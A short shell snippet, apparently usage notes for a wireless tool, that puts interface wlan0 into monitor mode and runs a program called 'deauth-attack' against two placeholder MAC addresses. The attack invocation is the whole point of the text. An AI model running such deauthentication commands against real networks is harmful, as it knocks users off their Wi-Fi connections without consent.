sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up

sudo ./deauth-attack wlan0 aa:aa:aa:aa:aa:aa bb:bb:bb:bb:bb:bb
